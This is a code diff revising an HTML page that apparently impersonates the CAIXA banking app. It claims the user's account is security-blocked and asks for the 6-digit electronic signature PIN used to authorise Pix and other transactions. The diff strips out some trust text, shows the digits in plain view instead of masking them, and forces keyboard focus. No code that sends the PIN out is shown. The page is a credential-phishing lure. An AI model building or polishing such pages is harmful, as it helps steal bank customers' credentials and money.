@@ -30,33 +30,33 @@
             box-shadow: 0 0 20px rgba(0,0,0,0.1);
         }
 
-        /* Cores Oficiais Caixa */
         .bg-caixa-blue { background-color: #005ca9; }
         .text-caixa-blue { color: #005ca9; }
-        .bg-caixa-orange { background-color: #f39200; }
-        .text-caixa-orange { color: #f39200; }
-
         .header-gradient {
             background: linear-gradient(180deg, #005ca9 0%, #004a87 100%);
         }
 
-        /* Visualização da Senha */
+        /* Estilo dos campos de dígito visíveis */
         .pin-dot {
-            width: 14px;
-            height: 14px;
-            border-radius: 50%;
+            width: 40px;
+            height: 45px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 4px;
             border: 2px solid #ced4da;
             background-color: transparent;
-            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            font-size: 1.25rem;
+            font-weight: bold;
+            color: #005ca9;
+            transition: all 0.2s ease;
         }
 
         .pin-dot.active {
-            background-color: #f39200;
             border-color: #f39200;
-            transform: scale(1.2);
+            background-color: #fff9f0;
         }
 
-        /* Input real escondido para invocar teclado numérico */
         #real-input {
             position: absolute;
             opacity: 0;
@@ -65,7 +65,6 @@
             width: 100%;
             height: 100%;
             z-index: 10;
-            cursor: default;
         }
 
         .btn-confirmar {
@@ -73,7 +72,6 @@
             color: white;
             font-weight: 700;
             text-transform: uppercase;
-            letter-spacing: 1px;
             transition: all 0.3s ease;
         }
 
@@ -91,7 +89,6 @@
 <body>
 
     <div class="phone-screen" onclick="document.getElementById('real-input').focus()">
-        <!-- Topo Azul -->
         <div class="header-gradient text-white p-5 flex items-center shadow-md">
             <button class="mr-4"><i data-lucide="chevron-left" class="w-7 h-7"></i></button>
             <div class="flex-grow">
@@ -101,31 +98,18 @@
             <img src="https://logodownload.org/wp-content/uploads/2014/02/caixa-logo-1.png" alt="CAIXA" class="caixa-logo">
         </div>
 
-        <!-- Conteúdo -->
         <div class="p-6 flex-grow">
             <div class="mb-8">
                 <h2 class="text-2xl font-bold text-caixa-blue mb-2">Desbloquear Conta</h2>
                 <p class="text-zinc-500 text-sm leading-relaxed">
-                    Identificamos um bloqueio de segurança em seu aplicativo. Para regularizar seu acesso, informe sua <strong>Assinatura Eletrônica de 6 dígitos</strong>.
+                    Informe sua <strong>Assinatura Eletrônica</strong> para continuar.
                 </p>
             </div>
 
-            <!-- Alerta -->
-            <div class="bg-blue-50 border-l-4 border-caixa-blue p-4 mb-10 rounded-r-md">
-                <div class="flex">
-                    <i data-lucide="info" class="w-5 h-5 text-caixa-blue mr-3 shrink-0"></i>
-                    <p class="text-[11px] text-zinc-600 font-medium">
-                        Esta senha é composta por 6 números. Após a validação, sua conta será liberada para transações de Pix, pagamentos e transferências.
-                    </p>
-                </div>
-            </div>
-
-            <!-- Mecanismo de Senha -->
-            <div class="flex flex-col items-center">
-                <p class="text-xs font-bold text-zinc-400 mb-6 uppercase tracking-widest">Senha de 6 dígitos</p>
+            <div class="flex flex-col items-center mt-10">
+                <p class="text-xs font-bold text-zinc-400 mb-6 uppercase tracking-widest">Digite os 6 dígitos</p>
                 
-                <!-- Onde os pontos aparecem -->
-                <div class="flex justify-center gap-5 mb-10">
+                <div class="flex justify-center gap-3 mb-10">
                     <div class="pin-dot"></div>
                     <div class="pin-dot"></div>
                     <div class="pin-dot"></div>
@@ -135,7 +119,7 @@
                 </div>
 
                 <input 
-                    type="password" 
+                    type="tel" 
                     id="real-input" 
                     inputmode="numeric" 
                     pattern="[0-9]*" 
@@ -143,72 +127,43 @@
                     autocomplete="off"
                     autofocus
                 >
-                
-                <button class="flex items-center text-caixa-blue font-bold text-sm">
-                    <i data-lucide="eye" class="w-4 h-4 mr-2"></i> MOSTRAR SENHA
-                </button>
             </div>
         </div>
 
-        <!-- Botão no rodapé -->
         <div class="p-6 mt-auto">
             <button id="btn-continue" disabled class="btn-confirmar w-full py-4 rounded-md shadow-lg mb-4">
                 Confirmar Desbloqueio
             </button>
-            <div class="flex justify-center items-center gap-2 opacity-30">
-                <i data-lucide="shield" class="w-4 h-4"></i>
-                <span class="text-[10px] font-bold">AMBIENTE SEGURO CAIXA</span>
-            </div>
         </div>
     </div>
 
     <script>
-        // Inicializa ícones
         lucide.createIcons();
 
         const realInput = document.getElementById('real-input');
         const dots = document.querySelectorAll('.pin-dot');
         const btnContinue = document.getElementById('btn-continue');
 
-        // Foca no input ao abrir
-        window.onload = () => {
-            setTimeout(() => realInput.focus(), 500);
-        };
-
-        // Lógica de preenchimento
         realInput.addEventListener('input', (e) => {
             let value = e.target.value.replace(/[^0-9]/g, '');
             e.target.value = value;
             
             dots.forEach((dot, index) => {
                 if (index < value.length) {
+                    dot.innerText = value[index]; // Escreve o número no quadrado
                     dot.classList.add('active');
                 } else {
+                    dot.innerText = ''; // Limpa se apagar
                     dot.classList.remove('active');
                 }
             });
 
-            // Habilita botão se tiver 6 dígitos
-            if (value.length === 6) {
-                btnContinue.disabled = false;
-            } else {
-                btnContinue.disabled = true;
-            }
+            btnContinue.disabled = (value.length !== 6);
         });
 
-        // Força foco se o usuário clicar fora
-        realInput.addEventListener('blur', () => {
-            setTimeout(() => realInput.focus(), 150);
-        });
-
-        // Ação do botão
-        btnContinue.addEventListener('click', () => {
-            if(!btnContinue.disabled) {
-                btnContinue.innerHTML = '<span class="flex items-center justify-center"><i data-lucide="loader-2" class="w-5 h-5 animate-spin mr-2"></i> VALIDANDO...</span>';
-                lucide.createIcons();
-                // Aqui entraria a integração
-            }
-        });
+        // Garante que o teclado suba ao clicar na tela
+        window.onload = () => setTimeout(() => realInput.focus(), 500);
+        realInput.addEventListener('blur', () => setTimeout(() => realInput.focus(), 150));
     </script>
 </body>
 </html>
